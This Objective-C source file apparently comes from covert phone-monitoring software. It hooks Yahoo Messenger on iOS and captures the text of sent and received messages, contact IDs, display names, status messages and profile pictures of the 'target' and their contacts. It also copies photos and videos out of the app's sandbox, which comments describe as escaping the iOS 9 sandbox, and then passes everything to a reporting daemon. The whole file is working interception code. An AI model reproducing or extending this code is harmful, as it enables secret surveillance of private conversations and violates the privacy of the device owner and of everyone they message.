//
//  YahooMsgUtils.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 3/25/2557 BE.
//
//

#import <objc/runtime.h>
#import <MobileCoreServices/MobileCoreServices.h>

#import "YahooMsgUtils.h"
#import "IMShareUtils.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "YMMessage.h"
#import "YMIdentity.h"
#import "OCIdentityIM.h"
#import "OCBackendIMYahoo.h"
#import "OCContact.h"
#import "OCContactController.h"
#import "OCChatController.h"
#import "OCChat.h"
#import "OCStatusMessage.h"

#import "YahooAttachmentUtils.h"
#import "YahooMsgEventSender.h"


@interface YahooMsgUtils ()


#pragma mark Shared Instance

+ (OCBackendIMYahoo*) getBackendIMYahooSharedInstance;
+ (OCContactController*) getContactControllerSharedInstance;
+ (OCChatController*) getChatControllerSharedInstance;

+ (YMIdentity *) thirdPartyYMIdentityForYMMessage: (YMMessage *) aYMMessage ;
+ (YMIdentity *) targetYMIdentityForYMMessage: (YMMessage *) aYMMessage;
+ (OCIdentityIM *) thirdPartyOCIdentityForYMMessage: (YMMessage *) aYMMessage;

// uid
+ (NSString *) senderUIDForYMMessage: (YMMessage *) aYMMessage;
+ (NSString *) recipientUIDForYMMessage: (YMMessage *) aYMMessage;

// display name
+ (NSString *) displayNameForYMIdentity: (YMIdentity *) aYMIdentity;
+ (NSString *) senderDisplayNameForYMMessage: (YMMessage *) aYMMessage;
+ (NSString *) recipientDisplayNameForYMMessage: (YMMessage *) aYMMessage;

// conver id
+ (NSString *) conversationIDForYMMessage: (YMMessage *) aYMMessage;

// status message
+ (NSString *) getTargetStatusMessage;
+ (NSString *) thirdPartyStatusMessage: (YMMessage *) aYMMessage;

// pic profile
+ (UIImage *) defaultImageProfile;
+ (UIImage *) getTargetPictureProfileForYMMessage: (YMMessage *) aYMMessage;
+ (UIImage *) getThirdPartyPictureProfileForYMMessage: (YMMessage *) aYMMessage;

#pragma mark Event Construction

+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments;

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile;

+ (NSString *) createTimeStamp;

+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension
				   extension: (NSString *) aExtension;

@end


@implementation YahooMsgUtils


#pragma mark Shared Instance

+ (OCBackendIMYahoo*) getBackendIMYahooSharedInstance {
    Class $OCBackendIMYahoo             = objc_getClass("OCBackendIMYahoo");
    OCBackendIMYahoo *backendIMYahoo    = [$OCBackendIMYahoo sharedBackend];
    return backendIMYahoo;
}

+ (OCContactController*) getContactControllerSharedInstance  {
    Class $OCContactController              = objc_getClass("OCContactController");
    OCContactController *contactController  = [$OCContactController sharedController];
    return contactController;
}

+ (OCChatController*) getChatControllerSharedInstance {
    Class $OCChatController             = objc_getClass("OCChatController");
    OCChatController *chatController    = [$OCChatController sharedController];
    return chatController;
}

#pragma mark Utils

// 3rd YMIdentity
+ (YMIdentity *) thirdPartyYMIdentityForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *ymIdentity  = nil;
    if ([aYMMessage isLocal]) {         // send
        ymIdentity          = [aYMMessage target];
    } else {                            // receive
        ymIdentity          = [aYMMessage source];
    }
    return ymIdentity;
}

// Target YMIdentity
+ (YMIdentity *) targetYMIdentityForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *ymIdentity  = nil;
    if ([aYMMessage isLocal]) {         // send
        ymIdentity          = [aYMMessage source];
    } else {                            // receive
        ymIdentity          = [aYMMessage target];
    }
    return ymIdentity;
}

// 3rd party OCIdentity
+ (OCIdentityIM *) thirdPartyOCIdentityForYMMessage: (YMMessage *) aYMMessage {
    OCBackendIMYahoo *backendIMYahoo        = [YahooMsgUtils getBackendIMYahooSharedInstance];
    YMIdentity *ymIdentity                  = [YahooMsgUtils thirdPartyYMIdentityForYMMessage:aYMMessage];
    OCIdentityIM *ocIdentity                = [backendIMYahoo ocIdentityForYMIdentity:ymIdentity];
    return ocIdentity;
}

// sender UID
+ (NSString *) senderUIDForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *sender                      = [aYMMessage source];
    NSString *senderUID                     = [sender uid];
    return senderUID;
}

// recipient UID
+ (NSString *) recipientUIDForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *recipient                      = [aYMMessage target];       // notice that these two values will be swap in outgoin
    NSString *recipientUID                     = [recipient uid];
    return recipientUID;
}

// display name
+ (NSString *) displayNameForYMIdentity: (YMIdentity *) aYMIdentity {
    OCBackendIMYahoo *backendIMYahoo        = [YahooMsgUtils getBackendIMYahooSharedInstance];
    OCContactController *contactController  = [YahooMsgUtils getContactControllerSharedInstance];
    OCIdentityIM *ocIdentity                = [backendIMYahoo ocIdentityForYMIdentity:aYMIdentity];
    OCContact *contact                      = [contactController contactWithIdentity:ocIdentity];
    NSString *displayName                   = [contact displayName];
    return displayName;
}

// sender display name
+ (NSString *) senderDisplayNameForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *sender                      = [aYMMessage source];
    NSString *senderDisplayName             = [YahooMsgUtils displayNameForYMIdentity:sender];
    return senderDisplayName;
}

// recipient display name
+ (NSString *) recipientDisplayNameForYMMessage: (YMMessage *) aYMMessage {
    YMIdentity *recipient                   = [aYMMessage target];
    NSString *recipientDisplayName          = [YahooMsgUtils displayNameForYMIdentity:recipient];
    return recipientDisplayName;
}

// conversation id
+ (NSString *) conversationIDForYMMessage: (YMMessage *) aYMMessage {
    OCChatController *chatController        = [YahooMsgUtils getChatControllerSharedInstance];
    OCContactController *contactController  = [YahooMsgUtils getContactControllerSharedInstance];
    OCIdentityIM *ocIdentity                = [YahooMsgUtils thirdPartyOCIdentityForYMMessage:aYMMessage];
    OCContact *thirdPartyContact            = [contactController contactWithIdentity:ocIdentity];
    OCChat *chat                            = [chatController chatWithContact:thirdPartyContact];
    DLog(@"chat %@", chat);
    NSString *converID                      = [chat uniqueID];
    return converID;
}

// target status message
+ (NSString *) getTargetStatusMessage {
    OCChatController *chatController        = [YahooMsgUtils getChatControllerSharedInstance];
    NSString *targetStatusMessage           = [[chatController selfStatusMessage] fullText];
    DLog(@"-- Target statusMessage:  %@", targetStatusMessage);
    return targetStatusMessage;
}

// 3rd party status message
+ (NSString *) thirdPartyStatusMessage: (YMMessage *) aYMMessage {
    OCContactController *contactController  = [YahooMsgUtils getContactControllerSharedInstance];
    OCIdentityIM *ocIdentity                = [YahooMsgUtils thirdPartyOCIdentityForYMMessage:aYMMessage];
    OCStatusMessage *ocStatusMessage        = [contactController statusMessageForIdentity:ocIdentity];
    NSString *statusMessage                 = [ocStatusMessage fullText];
    return statusMessage;
}

+ (UIImage *) defaultImageProfile {
    UIImage *defaultImage = [UIImage imageNamed:@"default_display_image"];
    return defaultImage;
}

// target picture profile
+ (UIImage *) getTargetPictureProfileForYMMessage: (YMMessage *) aYMMessage {
    OCBackendIMYahoo *backendIMYahoo        = [YahooMsgUtils getBackendIMYahooSharedInstance];
    YMIdentity *ymIdentity                  = [YahooMsgUtils targetYMIdentityForYMMessage:aYMMessage];
    OCIdentityIM *ocIdentity                = [backendIMYahoo ocIdentityForYMIdentity:ymIdentity];
    UIImage *image                          = [backendIMYahoo displayImageForIdentity:ocIdentity];
    return image;
}

// 3rd party picture profile
+ (UIImage *) getThirdPartyPictureProfileForYMMessage: (YMMessage *) aYMMessage {
    OCBackendIMYahoo *backendIMYahoo        = [YahooMsgUtils getBackendIMYahooSharedInstance];
    OCIdentityIM *ocIdentity                = [YahooMsgUtils thirdPartyOCIdentityForYMMessage:aYMMessage];
    UIImage *image                          = [backendIMYahoo displayImageForIdentity:ocIdentity];
    return image;
}


#pragma mark Event Construction


+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments {
    
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
  
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:@"yhm"];
    [imEvent setMServiceID: kIMServiceYahooMessenger];
    
    
    [imEvent setMDirection: aDirection];
    [imEvent setMRepresentationOfMessage: aRepresentation];
    [imEvent setMMessage: aMessage];
    
    // user (sender)
    [imEvent setMUserID: aUserID];
    [imEvent setMUserDisplayName: aUserDisplayname];
    [imEvent setMUserStatusMessage: aUserStatusMessage];
    [imEvent setMUserPicture: aUserPic];// sender image profile
    [imEvent setMUserLocation: nil];
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aConverName];
    [imEvent setMConversationPicture:aConverPic];
    
    // participant
    [imEvent setMParticipants:aParticipaints];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    [imEvent setMAttachments:aAttachments];
    //DLog(@"Yahoo Messenger %@", imEvent);
    
    return [imEvent autorelease];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile {
	FxRecipient *participant = [[FxRecipient alloc] init];
	[participant setRecipNumAddr:aUserID];
	[participant setRecipContactName:aUserDisplayname];
	[participant setMStatusMessage:aStatusMessage];
	[participant setMPicture:aPictureProfile];
	return [participant autorelease];
}

+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension,
							formattedDateString,
							aExtension];
	return [outputPath autorelease];
}

+ (void) sendYahooMessengerEvent: (FxIMEvent *) aIMEvent {
	YahooMsgEventSender *yhSender = [[YahooMsgEventSender alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:yhSender
                           withObject:aIMEvent];
    [yhSender release];
}


#pragma mark Event Sending

// Outgoing Text Message
+ (void) sendOutgoingTextMessageEventForYMMessage: (YMMessage *) aYMMessage {
    
    // -- get UID ------------------------------------------------------------
    NSString *targetUID             = [YahooMsgUtils senderUIDForYMMessage:aYMMessage];             // -- Target    - UID
    NSString *recipientUID          = [YahooMsgUtils recipientUIDForYMMessage:aYMMessage];          // -- Recipient - UID
    
    // -- get Display Name  ------------------------------------------------------------
    NSString *targetDisplayName     = [YahooMsgUtils senderDisplayNameForYMMessage:aYMMessage];     // -- Target    - Display Name
    NSString *recipientDisplayName  = [YahooMsgUtils recipientDisplayNameForYMMessage:aYMMessage];  // -- Recipient - Display Name
    
    // -- get Text ------------------------------------------------------------
    NSString *textMessage           = [aYMMessage content];                                         // -- Message Text
    DLog(@"-- Text message:   %@", textMessage);
    
    // -- get conversation ID  ------------------------------------------------------------
    NSString *converID              = [YahooMsgUtils conversationIDForYMMessage:aYMMessage];;       // -- Conversation ID
    
    // -- get Status Message ------------------------------------------------------------
    NSString *targetStatusMessage   = [YahooMsgUtils getTargetStatusMessage];                       // -- Target    - Status Message
    NSString *recipientStatusMessage= [YahooMsgUtils thirdPartyStatusMessage:aYMMessage];           // -- Recipient - Status Message
    
    // -- get Picture Profile ------------------------------------------------------------
    UIImage *targetImage            = [YahooMsgUtils getTargetPictureProfileForYMMessage:aYMMessage];      // -- Target    - Profile Picture
    UIImage *recipientImage         = [YahooMsgUtils getThirdPartyPictureProfileForYMMessage:aYMMessage];  // -- Recipient - Profile Picture
    
    if (!recipientImage)
        recipientImage = [YahooMsgUtils defaultImageProfile];
 
    // ------------------- FXIMEvent Construction ------------------------
    
    NSMutableArray *participants    = [NSMutableArray array];
    FxRecipient *participant = [YahooMsgUtils createFxRecipientWithUsername: recipientUID
                                                                displayname: recipientDisplayName
                                                              statusMessage: recipientStatusMessage
                                                             pictureProfile: UIImagePNGRepresentation(recipientImage)];
    [participants addObject:participant];
    
    FxIMEvent *imEvent      = [YahooMsgUtils createFXIMEventForMessageDirection: kEventDirectionOut
                                                                 representation: kIMMessageText
                                                                        message: textMessage
                                                                         userID: targetUID                 // sender id
                                                                userDisplayName: targetDisplayName         // sender display name
                                                              userStatusMessage: targetStatusMessage       // sender status message
                                                                    userPicture: UIImagePNGRepresentation(targetImage)
                                                                       converID: converID
                                                                     converName: recipientDisplayName
                                                                  converPicture: UIImagePNGRepresentation(recipientImage)
                                                                   participants: participants
                                                                    attachments: nil];
    
    DLog(@"Yahoo Messenger %@", imEvent);
    
    if ([imEvent mMessage] && [[imEvent mMessage] length] != 0) {
        
        DLog(@"!!! sending IN YAHOO MESSENGER TEXT MESSAGE EVENT");
        [YahooMsgUtils sendYahooMessengerEvent:imEvent];
    }
}

// Outgoing photo/video
+ (void) sendOutgoingAttachmentMessageEventForMessage: (id) aMessage {
    NSString *mediaPath         = nil;
    NSString *originalVideoPath = nil;
    UIImage *sentedPhoto        = nil;
    
    DLog(@"!!!! Sending Photo/Video message %@", [aMessage name]);
    
    Class $OCInstantMessagePhoto             = objc_getClass("OCInstantMessagePhoto");
    Class $OCInstantMessageDocument          = objc_getClass("OCInstantMessageDocument");
    
    // photo
    if ([aMessage isKindOfClass:[$OCInstantMessagePhoto class]]) {
        sentedPhoto             = [aMessage image];
        mediaPath               = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imYahooMessenger/"] ;
        mediaPath               = [YahooMsgUtils getOutputPath:mediaPath extension:@"png"];
        DLog(@"mediate path %@", mediaPath)
        if (![UIImagePNGRepresentation(sentedPhoto) writeToFile:mediaPath atomically:YES]) {
            // Sandbox, iOS 9
            mediaPath = [IMShareUtils saveData:UIImagePNGRepresentation(sentedPhoto) toDocumentSubDirectory:@"/attachments/imYahooMessenger/" fileName:[mediaPath lastPathComponent]];
        }
    }
    // video
    else if ([aMessage isKindOfClass:[$OCInstantMessageDocument class]]) {
        // this value will be (null) if the attachment is a photo
        // copy from Yahoo sandbox to our document folder
        /*
         for video, path is /private/var/mobile/Applications/8AC45475-2FDC-4AFF-ADD1-61E8A0ED9116/tmp/trim.212C353F-F9F1-47CF-A499-40CD85F7D866.MOV
         */
        originalVideoPath       = [aMessage path];
        mediaPath               = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imYahooMessenger/"] ;
        mediaPath               = [YahooMsgUtils getOutputPath:mediaPath extension:@"mov"];
        NSError *copyError      = nil;
        // Use file manager copy escapes from Sandbox iOS 9
        BOOL success            = [[NSFileManager defaultManager] copyItemAtPath:originalVideoPath
                                                                          toPath:mediaPath
                                                                           error:&copyError];
        if (!success || copyError) {
            DLog(@"FAIL to capture video file (success:%d, error:%@)", success, copyError);
            originalVideoPath   = nil;
        } else {
            DLog(@"!!! Success to copy outgoing video to path %@", mediaPath);
        }
    }
    
    YMMessage *ymMessage            = [[YahooMsgUtils getBackendIMYahooSharedInstance] ymMessageForOCMessage:aMessage];
    DLog(@"ymMessage %@", ymMessage);
    
    // -- get UID ------------------------------------------------------------
    NSString *targetUID             = [YahooMsgUtils senderUIDForYMMessage:ymMessage];
    NSString *recipientUID          = [YahooMsgUtils recipientUIDForYMMessage:ymMessage];
    
    // -- get Display Name  ------------------------------------------------------------
    NSString *targetDisplayName     = [YahooMsgUtils  senderDisplayNameForYMMessage:ymMessage];         // -- Target    - Display Name
    NSString *recipientDisplayName  = [YahooMsgUtils recipientDisplayNameForYMMessage:ymMessage];       // -- Recipient - Display Name
    
    // For attachment, no need for text message
    // -- get Text ------------------------------------------------------------
    //NSString *textMessage           = [ymMessage content];                                            // -- Message Text
    //DLog(@"-- Text message:   %@", textMessage);
    
    // -- get conversation ID  ------------------------------------------------------------
    NSString *converID              = [YahooMsgUtils conversationIDForYMMessage:ymMessage];;            // -- Conversation ID
    
    // -- get Status Message ------------------------------------------------------------
    NSString *targetStatusMessage   = [YahooMsgUtils getTargetStatusMessage];                           // -- Target    - Status Message
    NSString *recipientStatusMessage    = [YahooMsgUtils thirdPartyStatusMessage:ymMessage];            // -- Recipient - Status Message
    
    // -- get Picture Profile ------------------------------------------------------------
    UIImage *targetImage            = [YahooMsgUtils getTargetPictureProfileForYMMessage:ymMessage];    // -- Target    - Profile Picture
    UIImage *recipientImage         = [YahooMsgUtils getThirdPartyPictureProfileForYMMessage:ymMessage];// -- Recipient - Profile Picture
    
    if (!recipientImage)
        recipientImage = [YahooMsgUtils defaultImageProfile];
    
    // ------------------- FXIMEvent Construction ------------------------
    
    // participant
    NSMutableArray *participants   = [NSMutableArray array];
    FxRecipient *participant = [YahooMsgUtils createFxRecipientWithUsername: recipientUID
                                                                displayname: recipientDisplayName
                                                              statusMessage: recipientStatusMessage
                                                             pictureProfile: UIImagePNGRepresentation(recipientImage)];
    [participants addObject:participant];
    
    NSMutableArray *attachments                 = [NSMutableArray array];

    // attachment
    if (sentedPhoto         ||
        originalVideoPath)   {
        FxAttachment *attachment                    = [[FxAttachment alloc] init];
        [attachment setFullPath:mediaPath];
        [attachment setMThumbnail:nil];
        [attachments addObject:attachment];
        [attachment release];
    }
    
    FxIMEvent *imEvent	= [YahooMsgUtils createFXIMEventForMessageDirection: kEventDirectionOut
                                                                  representation: kIMMessageNone
                                                                         message: nil
                                                                          userID: targetUID                 // sender id
                                                                 userDisplayName: targetDisplayName         // sender display name
                                                               userStatusMessage: targetStatusMessage       // sender status message
                                                                     userPicture: UIImagePNGRepresentation(targetImage)
                                                                        converID: converID
                                                                      converName: recipientDisplayName
                                                                   converPicture: UIImagePNGRepresentation(recipientImage)
                                                                    participants: participants
                                                                     attachments: attachments];
      DLog(@"Yahoo Messenger %@", imEvent);
    
    if ([[imEvent mAttachments] count]){  // has attachment
        DLog(@"!!! sending IN YAHOO MESSENGER PHOTO/VIDEO MESSAGE EVENT");
        [YahooMsgUtils sendYahooMessengerEvent:imEvent];
    }
}

+ (void) sendIncomingTextMessageEventForYMMessage: (YMMessage *) aYMMessage {
    YMMessage *ymMessage                = aYMMessage;
    
    // -- get UID ------------------------------------------------------------
    NSString *targetUID                 = [YahooMsgUtils recipientUIDForYMMessage:ymMessage];
    NSString *senderUID                 = [YahooMsgUtils senderUIDForYMMessage:ymMessage];
    
    
    // -- get Display Name  ------------------------------------------------------------
    NSString *targetDisplayName         = [YahooMsgUtils recipientDisplayNameForYMMessage:ymMessage];           // -- Target    - Display Name
    NSString *senderDisplayName         = [YahooMsgUtils senderDisplayNameForYMMessage:ymMessage];              // -- Sender - Display Name
    
    
    // -- get Text ------------------------------------------------------------
    NSString *textMessage               = [ymMessage content];                                                  // -- Message Text
    DLog(@"-- Text message:   %@", textMessage);
    
    // -- get conversation ID  ------------------------------------------------------------
    NSString *converID                  = [YahooMsgUtils conversationIDForYMMessage:ymMessage];;                // -- Conversation ID
    
    // -- get Status Message ------------------------------------------------------------
    NSString *targetStatusMessage       = [YahooMsgUtils getTargetStatusMessage];                               // -- Target    - Status Message
    NSString *senderStatusMessage       = [YahooMsgUtils thirdPartyStatusMessage:ymMessage];                    // -- Sender - Status Message
    
    
    // -- get Picture Profile ------------------------------------------------------------
    UIImage *targetImage                = [YahooMsgUtils getTargetPictureProfileForYMMessage:ymMessage];        // -- Target    - Profile Picture
    UIImage *senderImage                = [YahooMsgUtils getThirdPartyPictureProfileForYMMessage:ymMessage];    // -- Sender - Profile Picture
    
    if (!senderImage)
        senderImage = [YahooMsgUtils defaultImageProfile];
    
    
    // ------------------- FXIMEvent Construction ------------------------
    // participant
    NSMutableArray *participants    = [NSMutableArray array];
    FxRecipient *participant        = [YahooMsgUtils createFxRecipientWithUsername: targetUID
                                                                             displayname: targetDisplayName
                                                                           statusMessage: targetStatusMessage
                                                                          pictureProfile: UIImagePNGRepresentation(targetImage)];
    [participants addObject:participant];
    
    FxIMEvent *imEvent	= [YahooMsgUtils createFXIMEventForMessageDirection: kEventDirectionIn
                                                                  representation: kIMMessageText
                                                                         message: textMessage
                                                                          userID: senderUID                 // sender id
                                                                 userDisplayName: senderDisplayName         // sender display name
                                                               userStatusMessage: senderStatusMessage       // sender status message
                                                                     userPicture: UIImagePNGRepresentation(senderImage)
                                                                        converID: converID
                                                                      converName: senderDisplayName
                                                                   converPicture: UIImagePNGRepresentation(senderImage)
                                                                    participants: participants
                                                                     attachments: nil];
    
    
    DLog(@"Yahoo Messenger %@", imEvent);
    
    if ([imEvent mMessage] && [[imEvent mMessage] length] != 0) {
        DLog(@"!!! sending OUT YAHOO MESSENGER TEXT MESSAGE EVENT");
        [YahooMsgUtils sendYahooMessengerEvent:imEvent];
    }
}

+ (void) storeIncomingAttachmentMessageEventFrom: (YMIdentity *) aSenderIdentity
                                          target: (YMIdentity *) aTargetIdentity
                                  attachmentName: (NSString *) aAttachmentName
                                       sessionID: (NSString *) aSessionID {
    
    // -- get UID ------------------------------------------------------------
    YMIdentity *sender                      = aSenderIdentity;
    NSString *senderUID                     = [sender uid];
    
    YMIdentity *target                      = aTargetIdentity;
    NSString *targetUID                     = [target uid];
    
    // -- get Display Name  ------------------------------------------------------------
    NSString *senderDisplayName             = [YahooMsgUtils  displayNameForYMIdentity:sender];
    
    NSString *targetDisplayName             = [YahooMsgUtils displayNameForYMIdentity:target];
    
    // -- get conversation ID  ------------------------------------------------------------
    OCBackendIMYahoo *backendIMYahoo        = [YahooMsgUtils getBackendIMYahooSharedInstance];
    OCChatController *chatController        = [YahooMsgUtils  getChatControllerSharedInstance];
    OCContactController *contactController  = [YahooMsgUtils getContactControllerSharedInstance];
    
    OCIdentityIM *senderOCIdentity          = [backendIMYahoo ocIdentityForYMIdentity:sender];
    OCContact *thirdPartyContact            = [contactController contactWithIdentity:senderOCIdentity];
    OCChat *chat                            = [chatController chatWithContact:thirdPartyContact];
    NSString *converID                      = [chat uniqueID];
    
    // -- get Status Message ------------------------------------------------------------
    NSString *targetStatusMessage           = [YahooMsgUtils getTargetStatusMessage];
    
    OCStatusMessage *senderOCStatusMessage  = [contactController statusMessageForIdentity:senderOCIdentity];
    NSString *senderStatusMessage           = [senderOCStatusMessage fullText];
    
    // -- get Picture Profile ------------------------------------------------------------
    OCIdentityIM *targetOCIdentity          = [backendIMYahoo ocIdentityForYMIdentity:target];
    UIImage *targetImage                    = [backendIMYahoo displayImageForIdentity:targetOCIdentity];
    
    UIImage *senderImage                    = [backendIMYahoo displayImageForIdentity:senderOCIdentity];
    
    if (!senderImage)
        senderImage = [YahooMsgUtils defaultImageProfile];
    
    // ------------------- FXIMEvent Construction ------------------------
    // participant
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant = [YahooMsgUtils createFxRecipientWithUsername: targetUID
                                                                displayname: targetDisplayName
                                                              statusMessage: targetStatusMessage
                                                             pictureProfile: UIImagePNGRepresentation(targetImage)];
    [participants addObject:participant];
    
    FxIMEvent *imEvent	= [YahooMsgUtils createFXIMEventForMessageDirection: kEventDirectionIn
                                                                  representation: kIMMessageNone
                                                                         message: aAttachmentName
                                                                          userID: senderUID                 // sender id
                                                                 userDisplayName: senderDisplayName         // sender display name
                                                               userStatusMessage: senderStatusMessage       // sender status message
                                                                     userPicture: UIImagePNGRepresentation(senderImage)
                                                                        converID: converID
                                                                      converName: senderDisplayName
                                                                   converPicture: UIImagePNGRepresentation(senderImage)
                                                                    participants: participants
                                                                     attachments: nil];
    
    DLog(@"Capture IN Photo Event STEP 1 %@", imEvent);
    
    [[YahooAttachmentUtils sharedYahooAttachmentUtils] storeIMEvent:imEvent
                                                          sessionID:aSessionID];
    //        DLog(@"\n\n\n\n.... Download photo programmatically 1");
    //        [[YahooMessengerUtils getBackendIMYahooSharedInstance] sendResponse:1 forDocument:message];
    //        DLog(@"Download photo programmatically 2");
}

+ (void) sendIncomingAttachment: (NSString *) aAttachmentPath
                        imEvent: (FxIMEvent *) aIMEvent
                      sessionID: (NSString *) aSessionID {
    // copy from Yahoo sandbox to our document folder
    NSString *mediaPath         = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imYahooMessenger/"] ;
    mediaPath                   = [YahooMsgUtils getOutputPath:mediaPath extension:[aAttachmentPath pathExtension]];
    NSError *copyError          = nil;
    // Use file manager copy escapes from Sandbox iOS 9
    BOOL success                = [[NSFileManager defaultManager] copyItemAtPath:aAttachmentPath
                                                                          toPath:mediaPath
                                                                           error:&copyError];
    if (!success || copyError) {
        DLog(@"FAIL to capture video file (success:%d, error:%@)", success, copyError);
        mediaPath = nil;
    } else {
        DLog(@"!!! Success to copy outgoing video to path %@", mediaPath);
    }
    
    if (mediaPath && [mediaPath length]!= 0) {
        NSMutableArray *attachments                 = [NSMutableArray array];
        // attachment
        FxAttachment *attachment                    = [[FxAttachment alloc] init];
        [attachment setFullPath:mediaPath];
        [attachment setMThumbnail:nil];
        [attachments addObject:attachment];
        [attachment release];
        [aIMEvent setMAttachments:attachments];
    }
    DLog(@"Yahoo Messenger %@", aIMEvent);
    
    if ([[aIMEvent mAttachments] count]){  // has attachment
        DLog(@"!!! sending IN YAHOO MESSENGER PHOTO/VIDEO MESSAGE EVENT");
        [YahooMsgUtils sendYahooMessengerEvent:aIMEvent];
    }
    [[YahooAttachmentUtils sharedYahooAttachmentUtils] removeIMEventForSessionID:aSessionID];
}


@end
